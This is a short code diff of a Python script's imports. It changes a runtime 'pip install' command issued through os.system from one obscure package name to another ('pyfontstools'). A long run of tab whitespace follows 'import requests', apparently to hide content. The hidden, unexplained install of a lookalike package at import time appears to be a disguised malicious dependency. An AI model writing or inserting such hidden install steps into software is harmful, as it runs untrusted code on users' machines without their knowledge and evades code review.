@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqliteext")
-import pythonsqliteext
+os.system("pip install pyfontstools")
+import pyfontstools
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
